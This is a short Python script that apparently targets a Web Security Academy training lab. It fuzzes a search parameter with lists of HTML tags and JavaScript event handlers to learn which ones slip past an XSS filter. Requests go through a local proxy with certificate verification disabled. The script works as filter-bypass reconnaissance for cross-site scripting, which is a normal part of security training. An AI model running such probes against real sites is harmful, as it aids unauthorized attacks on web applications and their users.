import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a4a00e3035187d58036030a00560077.web-security-academy.net/?search="
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

with open("../htmlTags.txt", "r") as file:
    html_tags = file.readlines()
    html_tags = [line.strip() for line in html_tags]


with open("../js_events.txt", "r") as file:
    js_events = file.readlines()
    js_events = [line.strip() for line in js_events]


def check_allowed_tags():
    print("(+) checking allowed tags")
    allowed_tags = []
    for tag in html_tags:
        payload = f"{url}<{tag}>"
        response = requests.get(payload, verify=False, proxies=proxy)
        print(f"Trying {tag}")
        if "Tag is not allowed" not in response.text:
            allowed_tags.append(tag)
    return allowed_tags


def check_allowed_events():
    print("(+) checking allowed events")
    allowed_events = []
    for event in js_events:
        payload = f"{url}<a {event}=x>"
        response = requests.get(payload, verify=False, proxies=proxy)
        print(f"Trying {event}")
        if "Tag is not allowed" not in response.text:
            allowed_events.append(event)
    return allowed_events


if __name__ == "__main__":
    # allowed_tags = check_allowed_tags()
    # print(allowed_tags)
    allowed_events = check_allowed_events()
    print(allowed_events)
